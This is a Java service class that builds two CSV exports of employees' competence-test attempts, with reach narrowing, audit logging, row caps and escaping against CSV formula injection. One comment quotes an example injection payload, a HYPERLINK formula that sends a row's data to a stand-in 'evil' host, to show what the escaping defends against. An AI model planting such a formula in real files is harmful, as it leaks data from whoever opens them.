package dk.trustworks.intranet.competenceservice.services;

import dk.trustworks.intranet.competenceservice.content.CompetencePayloadCodec;
import dk.trustworks.intranet.competenceservice.domain.CompetencePlaceholderScanner;
import dk.trustworks.intranet.competenceservice.model.CompetenceAttempt;
import dk.trustworks.intranet.competenceservice.model.CompetenceAttemptDecision;
import dk.trustworks.intranet.competenceservice.model.CompetenceContentVersion;
import dk.trustworks.intranet.competenceservice.model.CompetenceRequirement;
import dk.trustworks.intranet.competenceservice.model.ContentKind;
import dk.trustworks.intranet.competenceservice.model.ContentStatus;
import dk.trustworks.intranet.competenceservice.model.DecisionType;
import dk.trustworks.intranet.domain.user.entity.User;
import jakarta.enterprise.context.ApplicationScoped;
import jakarta.inject.Inject;
import jakarta.ws.rs.WebApplicationException;
import jakarta.ws.rs.core.Response;
import lombok.extern.jbosslog.JBossLog;

import java.math.BigDecimal;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Comparator;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Objects;
import java.util.Set;

/**
 * The two CSV exports: the auditor file and the full attempt log.
 *
 * <p>These are the only place in the module where one person's compliance record is handed
 * to another person in bulk, which shapes every decision here.
 *
 * <ol>
 *   <li><strong>Reach is not re-derived.</strong> Both exports narrow through
 *       {@link CompetenceMatrixService#reachableUsers(String)} — the same call the matrix
 *       uses. A second, subtly different narrowing written "just for the export" is exactly
 *       how a data-scope leak happens: the matrix would show one population and the file a
 *       wider one, and nothing would look wrong on screen.</li>
 *   <li><strong>Every field is escaped against CSV formula injection</strong> (CWE-1236,
 *       spec §10.3). See {@link #csv(String)}.</li>
 *   <li><strong>Two endpoints, not one with a flag.</strong> The auditor file must not be
 *       producible by accident from the full export, so the two row sets are built by two
 *       methods that share only formatting (spec §6.2).</li>
 *   <li><strong>Every export is logged</strong> with the {@code COMPETENCE_EXPORT} token
 *       (spec §10.7). Reading colleagues' training records in bulk is an access event, and
 *       the production log sweep filters on an explicit token list — an untokenised line is
 *       invisible to monitoring.</li>
 *   <li><strong>Capped, never truncated</strong> (spec §10.10). A silently short evidence
 *       file is worse than no file, so an oversized export is a {@code 400}.</li>
 * </ol>
 *
 * <p>Answers are never stored at all, and option ids and payloads are never read into a
 * row here — the export can only carry the aggregate, which is the point of §4.5.
 *
 * <p>Pseudonymised subjects (§10.9, {@code useruuid} rewritten to {@code erased:…}) drop
 * out on their own: they have no {@code user} row, so they are never in anybody's reach.
 * The rows stay in the database for aggregate compliance history, which is the intent.
 *
 * <p>This service performs no authorization of its own beyond the reach narrowing. The
 * resource that calls it carries {@code @RolesAllowed({"competence:approve"})}.
 */
@JBossLog
@ApplicationScoped
public class CompetenceExportService {

    /**
     * Spec §10.10. With ~60 people and a handful of requirements a real export is two or
     * three orders of magnitude below this, so hitting the cap means the reach is wrong or
     * the retention window has never been applied — both worth an error rather than a
     * quietly incomplete file.
     */
    static final int MAX_EXPORT_ROWS = 5000;

    /**
     * Excel on Windows still treats a bare {@code \n} file as one long line in several
     * import paths, and this file is opened in Excel by auditors, not by a parser.
     */
    private static final String LINE = "\r\n";

    /**
     * A UTF-8 BOM. Without it Excel decodes the file as the machine's legacy code page and
     * every Danish name comes out as {@code Ã¸}. The character is emitted as {@code EF BB
     * BF} once the resource writes this String as UTF-8, so the resource must produce
     * {@code text/csv;charset=UTF-8}. Written as an escape rather than as the character
     * itself so it survives a copy-paste through an editor that strips invisible marks.
     */
    private static final String BOM = "\uFEFF";

    /** First characters that make a spreadsheet treat a cell as a formula. */
    private static final String FORMULA_TRIGGERS = "=+-@\t\r";

    /**
     * {@code DateUtils} formats {@code LocalDate} only — it has no {@code LocalDateTime}
     * formatter to reuse — so timestamps use the ISO form directly. ISO is also the right
     * choice for an evidence file: unambiguous, sortable, and locale-independent, which a
     * Danish {@code dd-MM-yyyy} would not be once the file crosses a border.
     */
    private static final DateTimeFormatter TIMESTAMP = DateTimeFormatter.ISO_LOCAL_DATE_TIME;

    private static final String APPROVED_HEADER = header(
            "employee", "kref", "requirement", "score", "threshold", "testVersion",
            "takenAt", "approvedBy", "approvedAt", "unresolvedPlaceholders");

    private static final String ATTEMPTS_HEADER = header(
            "employee", "kref", "requirement", "testVersion", "startedAt", "submittedAt",
            "score", "threshold", "passed", "decision", "decidedBy", "decidedAt", "abandoned");

    /**
     * The header row goes through the same escaping as the data. The column names are
     * hard-coded and harmless, but a file where some rows are quoted and others are not is
     * a file whose parser has to guess, and "the header is special" is how the escaping
     * rule starts eroding.
     */
    private static String header(String... columns) {
        StringBuilder row = new StringBuilder();
        for (String column : columns) {
            if (row.length() > 0) {
                row.append(',');
            }
            row.append(csv(column));
        }
        return row.toString();
    }

    @Inject
    CompetenceMatrixService matrixService;

    @Inject
    CompetenceStatusService statusService;

    // -----------------------------------------------------------------------
    // the auditor export
    // -----------------------------------------------------------------------

    /**
     * Approved attempts only — the file that goes to an auditor.
     *
     * <p>A row appears here only when the attempt was submitted, passed, is not abandoned,
     * and its <em>latest</em> decision is APPROVED. Revocation therefore removes a row
     * rather than annotating one: a REVOKED decision means the approval is withdrawn, and
     * an auditor file that still listed it would be asserting something Trustworks no
     * longer stands behind.
     *
     * <p>{@code unresolvedPlaceholders} carries the count for the microcourse content the
     * record was taken under (spec §9.4), so an approval earned against content that still
     * said "[Udfyldes af Trustworks · TW-nn]" is visible in the file rather than silent.
     * The count is resolved by {@link #courseVersionAt}: the COURSE version whose
     * {@code publishedAt} is the latest one at or before the attempt. The attempt's own
     * frozen version is a TEST version and carries no callouts, so it cannot answer this
     * question itself. When no publication timestamp resolves — content seeded without one,
     * or a requirement whose course history has been purged — the cell falls back to the
     * count for the requirement's <em>current</em> ACTIVE course version, which is an
     * approximation and is the only value in this file that is not a frozen fact. A blank
     * cell means the stored payload could not be parsed; the WARN log names the version.
     */
    public String approvedCsv(String actorUuid) {
        Set<String> reach = matrixService.reachableUsers(actorUuid);
        List<CompetenceAttempt> attempts = attemptsWithinReach(reach);
        Map<String, CompetenceAttemptDecision> decisions = latestDecisions(attempts);

        List<CompetenceAttempt> rows = new ArrayList<>();
        for (CompetenceAttempt attempt : attempts) {
            if (attempt.getSubmittedAt() == null || attempt.isAbandoned() || !attempt.isPassed()) {
                continue;
            }
            CompetenceAttemptDecision decision = decisions.get(attempt.getUuid());
            if (decision == null || decision.getDecision() != DecisionType.APPROVED) {
                continue;
            }
            rows.add(attempt);
        }
        requireWithinRowCap(rows.size());

        Map<String, String> names = namesOf(union(
                rows.stream().map(CompetenceAttempt::getUseruuid).toList(),
                rows.stream()
                        .map(a -> decisions.get(a.getUuid()))
                        .filter(Objects::nonNull)
                        .map(CompetenceAttemptDecision::getActorUuid)
                        .toList()));
        Map<String, CompetenceRequirement> requirements = requirementIndex();
        rows.sort(rowOrder(names));

        Map<String, List<CompetenceContentVersion>> courseHistory = new HashMap<>();
        Map<String, Integer> placeholderCounts = new HashMap<>();

        StringBuilder out = new StringBuilder(BOM).append(APPROVED_HEADER).append(LINE);
        for (CompetenceAttempt attempt : rows) {
            CompetenceAttemptDecision decision = decisions.get(attempt.getUuid());
            out.append(csv(displayName(names, attempt.getUseruuid()))).append(',')
                    .append(csv(attempt.getKref())).append(',')
                    .append(csv(requirementName(requirements, attempt.getRequirementUuid()))).append(',')
                    .append(csv(decimal(attempt.getScore()))).append(',')
                    .append(csv(decimal(attempt.getThresholdSnapshot()))).append(',')
                    .append(csv(attempt.getVersionLabel())).append(',')
                    .append(csv(timestamp(attempt.getSubmittedAt()))).append(',')
                    .append(csv(displayName(names, decision.getActorUuid()))).append(',')
                    .append(csv(timestamp(decision.getDecidedAt()))).append(',')
                    .append(csv(unresolvedPlaceholders(attempt, courseHistory, placeholderCounts)))
                    .append(LINE);
        }

        log.infof("COMPETENCE_EXPORT kind=approved actor=%s rows=%d scope=%s",
                actorUuid, rows.size(), scopeToken(reach));
        return out.toString();
    }

    // -----------------------------------------------------------------------
    // the full export
    // -----------------------------------------------------------------------

    /**
     * Every attempt within reach, including failures, revocations, abandoned attempts and
     * attempts still in progress.
     *
     * <p>This is the operational file, not the evidence file. It exists because "who keeps
     * failing" and "who started and never finished" are real questions for a team lead, and
     * because a revocation has to be traceable somewhere — it is invisible in the auditor
     * export by design. Nothing is filtered out, so blank cells are normal: an in-progress
     * attempt has no {@code submittedAt}, no {@code score} and no {@code passed}.
     *
     * <p>{@code decision} is the latest decision, or {@code PENDING} for a passed attempt
     * that nobody has acted on yet. A failed attempt gets a blank rather than
     * {@code PENDING}, because there is nothing outstanding to decide and a queue-shaped
     * word would read as an unfinished action.
     */
    public String attemptsCsv(String actorUuid) {
        Set<String> reach = matrixService.reachableUsers(actorUuid);
        List<CompetenceAttempt> rows = new ArrayList<>(attemptsWithinReach(reach));
        requireWithinRowCap(rows.size());

        Map<String, CompetenceAttemptDecision> decisions = latestDecisions(rows);
        Map<String, String> names = namesOf(union(
                rows.stream().map(CompetenceAttempt::getUseruuid).toList(),
                decisions.values().stream().map(CompetenceAttemptDecision::getActorUuid).toList()));
        Map<String, CompetenceRequirement> requirements = requirementIndex();
        rows.sort(rowOrder(names));

        StringBuilder out = new StringBuilder(BOM).append(ATTEMPTS_HEADER).append(LINE);
        for (CompetenceAttempt attempt : rows) {
            CompetenceAttemptDecision decision = decisions.get(attempt.getUuid());
            out.append(csv(displayName(names, attempt.getUseruuid()))).append(',')
                    .append(csv(attempt.getKref())).append(',')
                    .append(csv(requirementName(requirements, attempt.getRequirementUuid()))).append(',')
                    .append(csv(attempt.getVersionLabel())).append(',')
                    .append(csv(timestamp(attempt.getStartedAt()))).append(',')
                    .append(csv(timestamp(attempt.getSubmittedAt()))).append(',')
                    .append(csv(decimal(attempt.getScore()))).append(',')
                    .append(csv(decimal(attempt.getThresholdSnapshot()))).append(',')
                    .append(csv(bool(attempt.getPassed()))).append(',')
                    .append(csv(decisionLabel(attempt, decision))).append(',')
                    .append(csv(decision == null ? "" : displayName(names, decision.getActorUuid()))).append(',')
                    .append(csv(decision == null ? "" : timestamp(decision.getDecidedAt()))).append(',')
                    .append(csv(bool(attempt.isAbandoned())))
                    .append(LINE);
        }

        log.infof("COMPETENCE_EXPORT kind=attempts actor=%s rows=%d scope=%s",
                actorUuid, rows.size(), scopeToken(reach));
        return out.toString();
    }

    // -----------------------------------------------------------------------
    // escaping
    // -----------------------------------------------------------------------

    /**
     * Renders one CSV cell, defended against <strong>CSV formula injection
     * (CWE-1236)</strong> — spec §10.3.
     *
     * <p>Two independent things happen, and both are needed.
     *
     * <ul>
     *   <li>Every field is quoted and embedded quotes are doubled, so a comma, a newline or
     *       a quote in a name cannot shift the remaining columns one to the left. Quoting
     *       unconditionally rather than "only when needed" removes the class of bug where
     *       the needed-ness test and the escaping disagree.</li>
     *   <li>A value starting with {@code =}, {@code +}, {@code -}, {@code @}, TAB or CR is
     *       prefixed with an apostrophe. Quoting alone does <em>not</em> stop this: Excel
     *       and LibreOffice strip the quotes on import and then evaluate the contents, so
     *       a display name of {@code =HYPERLINK("http://evil/?"&A1,"Se rapport")} would
     *       exfiltrate the row on click. Employee names are attacker-influenced in
     *       principle — they arrive from Entra ID, not from this system — which is
     *       precisely why this is not optional for a file nobody re-validates before
     *       opening.</li>
     * </ul>
     *
     * <p>The apostrophe is applied before quoting; it is inert as far as CSV quoting is
     * concerned. A genuinely negative number would also pick up the apostrophe, which is
     * accepted: no column in either export can be negative, and a false positive here costs
     * a leading character while a false negative costs a formula execution.
     *
     * <p>Package-private so the fast tier can hit it directly without going through a
     * database — this is the one function in the module that must never regress.
     */
    static String csv(String value) {
        String cell = value == null ? "" : value;
        if (!cell.isEmpty() && FORMULA_TRIGGERS.indexOf(cell.charAt(0)) >= 0) {
            cell = "'" + cell;
        }
        return "\"" + cell.replace("\"", "\"\"") + "\"";
    }

    // -----------------------------------------------------------------------
    // rows
    // -----------------------------------------------------------------------

    /**
     * Every attempt row for the people the caller may see — including unsubmitted and
     * abandoned ones, which is why this does not reuse
     * {@code CompetenceAttempt.listSubmittedForUsers}: that finder serves the matrix, where
     * an abandoned attempt must not colour a cell. The export is the only caller that wants
     * the unfiltered set, so the query lives here rather than widening a shared finder.
     */
    private List<CompetenceAttempt> attemptsWithinReach(Set<String> reach) {
        if (reach == null || reach.isEmpty()) {
            return List.of();
        }
        return CompetenceAttempt.list("useruuid in ?1 order by submittedAt desc, startedAt desc",
                new ArrayList<>(reach));
    }

    private Map<String, CompetenceAttemptDecision> latestDecisions(List<CompetenceAttempt> attempts) {
        return statusService.latestDecisionsFor(
                attempts.stream().map(CompetenceAttempt::getUuid).toList());
    }

    /**
     * Stable, human-scannable order: person, then requirement, then oldest attempt first.
     * A deterministic order means two exports taken a minute apart diff cleanly, which is
     * what makes the file usable as evidence rather than as a snapshot.
     */
    private Comparator<CompetenceAttempt> rowOrder(Map<String, String> names) {
        return Comparator
                .comparing((CompetenceAttempt a) -> displayName(names, a.getUseruuid()),
                        String.CASE_INSENSITIVE_ORDER)
                .thenComparing((CompetenceAttempt a) -> a.getKref() == null ? "" : a.getKref())
                .thenComparing(CompetenceAttempt::getStartedAt,
                        Comparator.nullsLast(Comparator.naturalOrder()));
    }

    private void requireWithinRowCap(int rows) {
        if (rows > MAX_EXPORT_ROWS) {
            // Spec §10.10: an explicit error, never a silent truncation. A short evidence
            // file that looks complete is the failure mode worth spending a 400 on.
            throw new WebApplicationException(
                    "Export exceeds " + MAX_EXPORT_ROWS + " rows — narrow the filter",
                    Response.Status.BAD_REQUEST);
        }
    }

    // -----------------------------------------------------------------------
    // placeholder counts (spec §9.4)
    // -----------------------------------------------------------------------

    private String unresolvedPlaceholders(CompetenceAttempt attempt,
                                          Map<String, List<CompetenceContentVersion>> courseHistory,
                                          Map<String, Integer> placeholderCounts) {
        List<CompetenceContentVersion> history = courseHistory.computeIfAbsent(
                attempt.getRequirementUuid(), CompetenceExportService::courseHistoryOf);
        LocalDateTime takenAt = attempt.getSubmittedAt() != null
                ? attempt.getSubmittedAt()
                : attempt.getStartedAt();
        CompetenceContentVersion version = courseVersionAt(history, takenAt);
        if (version == null) {
            return "";
        }
        // containsKey rather than computeIfAbsent: a null count (unparseable payload) must
        // be remembered, or every row re-parses and re-warns for the same broken version.
        if (!placeholderCounts.containsKey(version.getUuid())) {
            placeholderCounts.put(version.getUuid(), countPlaceholders(version));
        }
        Integer count = placeholderCounts.get(version.getUuid());
        return count == null ? "" : String.valueOf(count);
    }

    private static List<CompetenceContentVersion> courseHistoryOf(String requirementUuid) {
        return CompetenceContentVersion.findHistory(requirementUuid).stream()
                .filter(v -> v.getContentKind() == ContentKind.COURSE)
                .toList();
    }

    /**
     * The COURSE version that was live at a given instant: the latest publication at or
     * before it. DRAFTs never have a {@code publishedAt} and so can never be selected,
     * which matters — a draft must never appear in an auditor file.
     *
     * <p>Falls back to the current ACTIVE version when no publication timestamp resolves
     * (seeded content, or an attempt predating the first publish). That fallback is an
     * approximation of history rather than history itself, and the javadoc on
     * {@link #approvedCsv(String)} says so out loud.
     *
     * <p>Package-private and static: pure, and worth testing without a database.
     */
    static CompetenceContentVersion courseVersionAt(List<CompetenceContentVersion> history,
                                                    LocalDateTime at) {
        CompetenceContentVersion best = null;
        for (CompetenceContentVersion version : history) {
            LocalDateTime publishedAt = version.getPublishedAt();
            if (publishedAt == null || (at != null && publishedAt.isAfter(at))) {
                continue;
            }
            if (best == null || publishedAt.isAfter(best.getPublishedAt())) {
                best = version;
            }
        }
        if (best != null) {
            return best;
        }
        for (CompetenceContentVersion version : history) {
            if (version.getStatus() == ContentStatus.ACTIVE) {
                return version;
            }
        }
        return null;
    }

    /** @return the number of unresolved placeholders, or {@code null} if unreadable */
    private Integer countPlaceholders(CompetenceContentVersion version) {
        try {
            return CompetencePlaceholderScanner
                    .scan(CompetencePayloadCodec.readCourse(version.getPayloadJson()))
                    .size();
        } catch (RuntimeException e) {
            // Never fail a whole export over one unreadable payload: the cell goes blank,
            // which is distinguishable from a genuine zero, and the version is named here.
            // The message is the parser's, so it carries no employee data.
            log.warnf("Unreadable competence course payload on version %s — "
                    + "placeholder count omitted from export: %s", version.getUuid(), e.getMessage());
            return null;
        }
    }

    // -----------------------------------------------------------------------
    // lookups and formatting
    // -----------------------------------------------------------------------

    /**
     * useruuid → full name, in one query. Actors are resolved alongside subjects: naming
     * the approver is the whole point of an approval record, and an approver is a leader
     * who may well sit outside the caller's own reach.
     */
    private Map<String, String> namesOf(Collection<String> useruuids) {
        Map<String, String> out = new HashMap<>();
        List<String> ids = useruuids.stream().filter(Objects::nonNull).distinct().toList();
        if (ids.isEmpty()) {
            return out;
        }
        List<User> users = User.list("uuid in ?1", ids);
        for (User user : users) {
            out.put(user.getUuid(), user.getFullname());
        }
        return out;
    }

    private static Collection<String> union(List<String> a, List<String> b) {
        Set<String> out = new HashSet<>(a);
        out.addAll(b);
        return out;
    }

    /**
     * Falls back to the uuid rather than to a blank. A pseudonymised subject reads as
     * {@code erased:…} and a deleted user reads as a uuid — both are honest, and neither
     * silently drops a row out of an evidence file.
     */
    private static String displayName(Map<String, String> names, String useruuid) {
        if (useruuid == null) {
            return "";
        }
        return names.getOrDefault(useruuid, useruuid);
    }

    private Map<String, CompetenceRequirement> requirementIndex() {
        Map<String, CompetenceRequirement> index = new HashMap<>();
        // listAllOrdered, not listActive: a retired requirement still has history, and its
        // rows must not degrade to a bare uuid the day somebody deactivates it.
        for (CompetenceRequirement requirement : CompetenceRequirement.listAllOrdered()) {
            index.put(requirement.getUuid(), requirement);
        }
        return index;
    }

    private static String requirementName(Map<String, CompetenceRequirement> index, String uuid) {
        CompetenceRequirement requirement = index.get(uuid);
        return requirement == null ? uuid : requirement.getName();
    }

    /**
     * PENDING only where a decision is actually outstanding — see
     * {@link #attemptsCsv(String)}.
     */
    private static String decisionLabel(CompetenceAttempt attempt, CompetenceAttemptDecision decision) {
        if (decision != null) {
            return decision.getDecision().name();
        }
        return attempt.isPassed() && !attempt.isAbandoned() ? "PENDING" : "";
    }

    /**
     * Scores and thresholds are emitted as dot-decimal fractions, exactly as stored, and
     * never as a locale-formatted percentage: a comma decimal separator would change the
     * column count in a comma-separated file, and the same export would otherwise mean
     * different things on a Danish and an English machine.
     */
    private static String decimal(BigDecimal value) {
        return value == null ? "" : value.toPlainString();
    }

    private static String timestamp(LocalDateTime value) {
        return value == null ? "" : TIMESTAMP.format(value);
    }

    private static String bool(Boolean value) {
        return value == null ? "" : String.valueOf(value.booleanValue());
    }

    /** Population size only — never the uuids. The log line is not a second export. */
    private static String scopeToken(Set<String> reach) {
        return "reach:" + (reach == null ? 0 : reach.size());
    }
}
